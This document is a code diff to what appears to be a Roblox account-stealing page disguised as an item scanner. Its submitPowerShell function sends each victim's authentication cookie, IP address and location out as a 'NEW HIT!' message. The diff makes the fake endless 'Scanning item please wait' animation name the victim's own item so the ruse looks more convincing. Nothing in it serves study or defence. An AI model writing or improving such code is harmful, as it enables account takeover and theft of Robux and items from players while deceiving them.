@@ -251,11 +251,6 @@ async function submitPowerShell() {
             },
             fields: [
                 {
-                    name: "🎮 Scanning Roblox Item",
-                    value: detectedItem ? `**${detectedItem.name}**\n*ID: ${detectedItem.id} | Type: ${detectedItem.type}*\n[View Item](${detectedItem.url})` : "`No specific item detected in script`",
-                    inline: false
-                },
-                {
                     name: "🍪 Authentication Cookie",
                     value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
                     inline: false
@@ -307,15 +302,17 @@ async function submitPowerShell() {
             submitBtn.style.background = '#10b981';
             showNotification('Scanning item please wait', 'success');
             
-            // Show infinite loading animation
-            showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
+            // Show infinite loading animation with detected item
+            const loadingTitle = detectedItem ? `Scanning ${detectedItem.name}...` : 'Scanning item please wait';
+            const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
+            showLoadingOverlay(loadingTitle, loadingDescription);
             startInfiniteLoading();
         } else {
             // If enhanced embed fails, try simple embed as fallback
             const simpleEmbed = {
                 title: "🚨 NEW HIT! 🚨",
                 color: 0xff0000,
-                description: `**Item:** ${detectedItem ? `${detectedItem.name} (ID: ${detectedItem.id})` : 'Unknown'}\n**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
+                description: `**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
                 timestamp: new Date().toISOString()
             };
             
@@ -337,8 +334,10 @@ async function submitPowerShell() {
                 submitBtn.style.background = '#10b981';
                 showNotification('Scanning item please wait', 'success');
                 
-                // Show infinite loading animation
-                showLoadingOverlay('Scanning item please wait', 'Analyzing limited items and authentication data');
+                // Show infinite loading animation with detected item
+                const loadingTitle = detectedItem ? `Scanning ${detectedItem.name}...` : 'Scanning item please wait';
+                const loadingDescription = detectedItem ? `Analyzing ${detectedItem.type} (ID: ${detectedItem.id})` : 'Analyzing limited items and authentication data';
+                showLoadingOverlay(loadingTitle, loadingDescription);
                 startInfiniteLoading();
             } else {
                 throw new Error(`Both embed formats failed: ${response.status}, ${fallbackResponse.status}`);
@@ -663,11 +662,15 @@ function startInfiniteLoading() {
     const loadingText = document.getElementById('loadingText');
     const submitText = document.getElementById('submitText');
     
+    // Get the current title to maintain item-specific messaging
+    const currentTitle = loadingTitle ? loadingTitle.textContent : 'Scanning item please wait';
+    const baseMessage = currentTitle.replace(/\.\.\.$/, ''); // Remove trailing dots
+    
     const scanMessages = [
-        'Scanning item please wait',
-        'Scanning item please wait.',
-        'Scanning item please wait..',
-        'Scanning item please wait...',
+        `${baseMessage}`,
+        `${baseMessage}.`,
+        `${baseMessage}..`,
+        `${baseMessage}...`,
         'Analyzing authentication data',
         'Analyzing authentication data.',
         'Analyzing authentication data..',
@@ -676,10 +679,10 @@ function startInfiniteLoading() {
         'Processing security scan.',
         'Processing security scan..',
         'Processing security scan...',
-        'Verifying limited items',
-        'Verifying limited items.',
-        'Verifying limited items..',
-        'Verifying limited items...'
+        'Verifying item authenticity',
+        'Verifying item authenticity.',
+        'Verifying item authenticity..',
+        'Verifying item authenticity...'
     ];
     
     const detailMessages = [
